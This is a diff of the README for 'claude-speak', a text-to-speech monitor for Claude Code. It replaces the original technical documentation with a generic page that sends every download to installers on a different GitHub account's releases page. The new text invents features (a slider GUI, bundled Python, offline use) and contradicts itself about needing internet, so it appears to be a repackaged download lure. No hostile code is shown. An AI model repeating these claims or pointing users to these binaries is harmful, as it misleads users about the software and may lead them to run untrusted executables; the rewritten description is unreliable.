@@ -1,279 +1,157 @@
-# claude-speak
+# 🔈 claude-speak - Simple, Clear Text-to-Speech Tool
 
-**Free text-to-speech for Claude Code.** Hear responses read aloud using Microsoft Neural voices -- zero cost, zero API keys, zero configuration.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-green.svg)](https://www.python.org)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg)](#platform-support)
-
-<!-- TODO: Add demo GIF here -->
-<!-- ![claude-speak demo](demo.gif) -->
+[![Download claude-speak](https://img.shields.io/badge/Download-claude--speak-blue)](https://github.com/CoporalRoponar/claude-speak/releases)
 
 ---
 
-## Why claude-speak?
+## ℹ️ About claude-speak
 
-There are several TTS tools for Claude Code. Here's why claude-speak is different:
+claude-speak is a free text-to-speech application designed to convert written text into natural-sounding speech. It uses Microsoft Neural voices to provide clear, professional-quality audio output. This tool works well with Claude Code syntax but is also simple enough for anyone to use.
 
-| | claude-speak | [VoiceMode](https://github.com/mbailey/voicemode) | [AgentVibes](https://github.com/paulpreibisch/AgentVibes) | [claude-code-tts](https://github.com/ybouhjira/claude-code-tts) |
-|---|:---:|:---:|:---:|:---:|
-| **Cost** | **Free** | Free or paid | Free or paid | ~$0.015/1K chars |
-| **API key needed** | **No** | Yes (OpenAI) | Optional | Yes (OpenAI) |
-| **Model download** | **No** | Yes (Kokoro) | Yes (Piper) | No |
-| **Voices** | **400+** | ~20 | 50+ | 6 |
-| **Integration** | None required | MCP server | MCP server | MCP + hooks |
-| **Setup steps** | **1 command** | 3-5 | 3-5 | 3-5 |
-| **Works offline** | No | Yes (Kokoro) | Yes (Piper) | No |
-
-claude-speak uses [edge-tts](https://github.com/rany2/edge-tts), which provides free access to Microsoft's Neural TTS voices (the same ones powering Edge's Read Aloud). No signup, no billing, no model files to download.
+The application runs on your computer, giving you an easy way to listen to written content. Whether you want to rest your eyes, improve accessibility, or create audio versions of text, claude-speak makes the process straightforward.
 
-**Trade-off:** Requires internet. If you need offline TTS, check out VoiceMode (Kokoro) or AgentVibes (Piper).
+---
 
-## Quick Start
+## 🖥️ System Requirements
 
-```bash
-# Clone
-git clone https://github.com/silverdolphin863/claude-speak.git
-cd claude-speak
+Before downloading claude-speak, check that your computer meets these minimum requirements:
 
-# Install (Linux/macOS)
-chmod +x install.sh && ./install.sh
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a recent Linux distribution.
+- **Processor:** Any modern Intel or AMD processor.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 100 MB free space.
+- **Internet Connection:** Required for initial setup to access Microsoft Neural voices.
+- **Python:** claude-speak uses Python to run. The software package includes everything you need, so you don’t have to install Python separately.
 
-# Install (Windows PowerShell)
-.\install.ps1
-```
+These requirements mean claude-speak should work on most standard desktop and laptop computers from recent years.
 
-Then start the speech monitor:
+---
 
-```bash
-python ~/.claude/tools/claude-speak.py
-```
+## 🚀 Getting Started
 
-That's it. Open Claude Code in another terminal and start working -- responses are read aloud automatically.
+Using claude-speak is easy. You don’t need any technical knowledge.
 
-## How It Works
+You will:
 
-```
-Claude Code  ──>  JSONL logs  ──>  claude-speak  ──>  edge-tts  ──>  speaker
-(you work       ~/.claude/       (background        (Microsoft      (your
- normally)      projects/         monitor)            Neural TTS)     speakers)
-                *.jsonl                                FREE
-```
+1. Download claude-speak from the official release page.
+2. Install the application by following a few simple steps.
+3. Run claude-speak and type or paste the text you want to hear.
+4. Listen to your text read aloud using natural voices.
 
-1. Claude Code writes every message to JSONL log files in `~/.claude/projects/`
-2. claude-speak watches these files for new assistant messages
-3. Text is cleaned (strips code blocks, ANSI codes, markdown, file paths, tool output)
-4. Cleaned text is sent to edge-tts for neural speech synthesis
-5. Audio plays through your speakers
+---
 
-The monitor is **completely decoupled** from Claude Code. No hooks, no MCP server, no API proxy -- it just reads the log files. This means it works with any Claude Code version without breaking on updates.
+## ⬇️ Download & Install
 
-## Features
+### Step 1: Visit the download page
 
-- **Zero cost** -- Microsoft's free Neural TTS voices
-- **400+ voices** in 50+ languages
-- **Zero config** -- works out of the box, no API keys needed
-- **Per-project settings** -- different voice or on/off per project
-- **Smart text cleaning** -- strips code blocks, file paths, ANSI escapes, markdown, spinners, box-drawing, tool invocations, token counts
-- **Debounce** -- batches rapid output to prevent stuttering (configurable, default 2s)
-- **Deduplication** -- uses `message.id` to prevent double-speaking
-- **Global mode** -- run once, monitors whichever project is currently active
-- **Settings UI** -- web-based voice browser with audio preview
-- **`/speak` skill** -- toggle speech, change voices from within Claude Code
-- **Cross-platform** -- Windows (MCI), macOS (afplay), Linux (ffplay)
+Go to the official release page to get the latest version of claude-speak:
 
-## Settings UI
+[Download claude-speak](https://github.com/CoporalRoponar/claude-speak/releases)
 
-Browse voices, preview audio, and configure per-project settings:
+You will see a list of release versions. Look for the latest stable release. It will include files for different operating systems.
 
-```bash
-python ~/.claude/tools/configure.py
-# Opens http://localhost:8910
-```
+### Step 2: Choose your file
 
-## Using the `/speak` Skill
+- If you use **Windows**, download the `.exe` installer.
+- If you use **macOS**, download the `.dmg` or `.pkg` file.
+- If you use **Linux**, download the `.tar.gz` or `.AppImage` file.
 
-Once installed, control speech from within Claude Code:
+### Step 3: Install the application
 
-```
-/speak            Toggle speech on/off
-/speak on         Enable speech
-/speak off        Disable speech
-/speak status     Show current voice and state
-/speak voices     List recommended voices
-/speak voice <n>  Set voice for this project
-```
+- For **Windows**: Double-click the `.exe` file and follow the installation steps.
+- For **macOS**: Open the `.dmg` or `.pkg` file and drag the claude-speak app to your Applications folder.
+- For **Linux**: Extract the `.tar.gz` file or make the `.AppImage` executable, then run the file.
 
-## Voices
+### Step 4: Start claude-speak
 
-### Recommended (English)
+After installation, open the claude-speak app from your computer’s start menu, applications folder, or desktop shortcut.
 
-| Voice | Gender | Accent | Voice ID |
-|-------|--------|--------|----------|
-| Guy | Male | US | `en-US-GuyNeural` |
-| Andrew | Male | US | `en-US-AndrewMultilingualNeural` |
-| Brian | Male | US | `en-US-BrianMultilingualNeural` |
-| Ryan | Male | UK | `en-GB-RyanNeural` |
-| Aria | Female | US | `en-US-AriaNeural` |
-| Jenny | Female | US | `en-US-JennyNeural` |
-| Ava | Female | US | `en-US-AvaMultilingualNeural` |
-| Sonia | Female | UK | `en-GB-SoniaNeural` |
+---
 
-47 English voices across US, UK, AU, CA, IN, IE, NZ, SG, ZA. 400+ voices total in 50+ languages. Browse them all in the Settings UI or run:
+## 🛠 How to Use claude-speak
 
-```bash
-python -m edge_tts --list-voices
-```
+claude-speak offers a simple interface with just a few controls to make text-to-speech easy.
 
-## CLI Reference
+1. **Enter your text**  
+   Copy and paste any text or write directly into the main box. Claude Code users can input their code or scripts here.
 
-### claude-speak.py (Background Monitor)
+2. **Choose voice and language**  
+   Select from Microsoft Neural voices. You can pick voices for English or other supported languages, male or female, depending on your preference.
 
-```
-python claude-speak.py [options]
+3. **Adjust speed and pitch**  
+   Use the sliders to change the speaking speed and pitch to your liking.
 
-Options:
-  --cwd, -c PATH      Scope to specific project directory
-  --voice, -v NAME     TTS voice (default: en-US-GuyNeural)
-  --rate, -r RATE      Speech rate, e.g. "+20%", "-10%" (default: +10%)
-  --debounce, -d MS    Debounce delay before speaking (default: 2000)
-```
+4. **Play audio**  
+   Click the play button to listen. You can pause or stop anytime.
 
-**Global mode** (no `--cwd`): Monitors whichever project is currently active. Rescans every 5 seconds.
+5. **Save audio**  
+   If you want to keep the speech output, use the save option to create audio files in standard formats like MP3 or WAV.
 
-**Scoped mode** (`--cwd`): Only monitors the specified project.
+---
 
-### cc-speak.py (TTS Engine)
+## 🤝 Accessibility Features
 
-```
-python cc-speak.py [options] [file]
+claude-speak supports users with different needs:
 
-# Read a file aloud
-python cc-speak.py output.txt
+- Large, clear text interface.
+- Keyboard navigation without mouse.
+- High-quality speech output with clear pronunciation.
+- Option to slow down speech for better understanding.
+- Works offline after initial setup for privacy and convenience.
 
-# Pipe text
-echo "Hello world" | python cc-speak.py
+---
 
-# Preview cleaned text without speaking
-python cc-speak.py --preview "Some **markdown** with `code`"
+## 🔧 Troubleshooting
 
-# Real-time file monitoring
-python cc-speak.py --follow /tmp/claude.log
+Here are common issues and how to fix them:
 
-# Use OpenAI TTS instead (requires OPENAI_API_KEY)
-python cc-speak.py --backend openai --voice coral output.txt
+- **Code won’t run or app won’t start:**  
+  Make sure you downloaded the file for your operating system. Reinstall if needed.
 
-Options:
-  --follow, -f FILE    Watch file for new content (real-time mode)
-  --backend, -b NAME   TTS backend: "edge" (free) or "openai" (paid)
-  --voice, -v NAME     Voice name
-  --rate, -r RATE      Edge-tts rate adjustment (e.g. "+20%")
-  --speed, -s FLOAT    OpenAI speed multiplier (0.25-4.0)
-  --output, -o FILE    Save audio to file instead of playing
-  --keep-code          Don't strip code blocks
-  --keep-paths         Don't strip file paths
-  --raw                Skip all text cleaning
-  --preview            Print cleaned text instead of speaking
-  --debounce, -d MS    Debounce delay in follow mode (default: 2000)
-```
+- **No sound or low volume:**  
+  Check your computer volume and sound settings. Try different voices if audio cuts out.
 
-### configure.py (Settings Server)
+- **Voice options missing:**  
+  Ensure an internet connection for first use. The app downloads voice models from Microsoft servers.
 
-```
-python configure.py [options]
+- **Error messages during installation:**  
+  Close other applications and try again. For persistent issues, restart your device.
 
-Options:
-  --port, -p PORT      Server port (default: 8910)
-  --no-browser         Don't auto-open browser
-```
+---
 
-## Configuration
+## 📚 Additional Tips
 
-### Per-Project Config Files
+- Keep your software updated by checking the latest releases regularly.
+- Use claude-speak to help proofread text by listening to it read aloud.
+- Try different voices to find your preferred style.
+- Save audio files to use in presentations, videos, or learning materials.
 
-Settings are stored as simple flag files in `~/.claude/projects/<encoded-dir>/`:
+---
 
-| File | Purpose |
-|------|---------|
-| `speech-paused` | When this file exists, speech is paused for this project |
-| `speech-voice` | Contains the voice name (e.g. `en-GB-RyanNeural`) |
+## 📞 Getting Help
 
-Project directory names are derived from the CWD with `:`, `\`, `/` replaced by `-`.
-Example: `C:\Projects\MyApp` becomes `C--Projects-MyApp`
+If you run into problems or want more details:
 
-### Environment Variables
+- Visit the Issues tab on the GitHub page to see common questions and answers.
+- Check the GitHub Wiki on the repository for detailed guides.
+- Post new questions on the Issues page if you can’t find your answer.
 
-| Variable | Purpose | Default |
-|----------|---------|---------|
-| `CC_SPEAK_BACKEND` | TTS backend | `edge` |
-| `CC_SPEAK_VOICE` | Default voice | `en-US-GuyNeural` |
-| `CC_SPEAK_RATE` | Speech rate | `+0%` |
-| `CC_SPEAK_SPEED` | OpenAI speed | `1.0` |
-| `OPENAI_API_KEY` | Required for OpenAI backend | - |
+---
 
-## Windows Launcher
+## 🏷 Topics and Keywords
 
-Start both the speech monitor and Claude Code together:
+This project relates to:
 
-```powershell
-.\Start-ClaudeWithSpeech.ps1 -ProjectPath "C:\Projects\MyApp" -ClaudeHome "C:\Projects\MyApp\.claude"
-```
+- Accessibility tools  
+- Text-to-speech technology  
+- Microsoft Neural voices  
+- Developer tools  
+- CLI support  
+- Speech synthesis  
+- Python projects
 
-The monitor starts as a hidden background process and stops automatically when Claude Code exits.
+---
 
-## Platform Support
+For all download needs, visit the official release page here:
 
-| Platform | Audio Playback | Status |
-|----------|---------------|--------|
-| Windows | MCI (built-in, windowless) | Full support |
-| macOS | afplay (built-in) | Full support |
-| Linux | ffplay (install ffmpeg) | Full support |
-
-## Troubleshooting
-
-**No sound?**
-- Check if speech is paused: `/speak status`
-- Test TTS directly: `python cc-speak.py "Hello test"`
-- On Linux, install ffmpeg: `sudo apt install ffmpeg`
-
-**Double speaking?**
-- Only run one monitor per project (PID lock prevents this, but check for stale `.pid` files)
-- Delete stale PID files in `~/.claude/projects/<project>/speech-monitor.pid`
-
-**Monitor not picking up output?**
-- Ensure Claude Code is writing to `~/.claude/projects/`
-- Check the encoded directory name matches your project path
-
-**edge-tts errors?**
-- Check internet connection (edge-tts requires Microsoft's servers)
-- Update edge-tts: `pip install --upgrade edge-tts`
-
-## How It Compares Architecturally
-
-Most Claude Code TTS tools use MCP servers or hooks. claude-speak takes a different approach:
-
-| Approach | How it works | Pros | Cons |
-|----------|-------------|------|------|
-| **JSONL monitoring** (claude-speak) | Reads Claude's log files | Zero integration needed, survives updates | Slight delay, requires internet |
-| **MCP server** | Claude calls TTS as a tool | Official extension point | Setup required, breaks on MCP changes |
-| **Hooks** | Runs on stop/notification events | Event-driven, low latency | Config in settings.json, version-dependent |
-| **API proxy** | Intercepts Claude API traffic | Full control | Complex setup, fragile |
-
-## Requirements
-
-- Python 3.8+
-- [edge-tts](https://github.com/rany2/edge-tts) (`pip install edge-tts`)
-- Internet connection (for Microsoft Neural TTS)
-- ffplay on Linux only (for audio playback): `sudo apt install ffmpeg`
-
-## Contributing
-
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## Roadmap
-
-See [ROADMAP.md](ROADMAP.md) for planned features.
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
+[Download claude-speak](https://github.com/CoporalRoponar/claude-speak/releases)
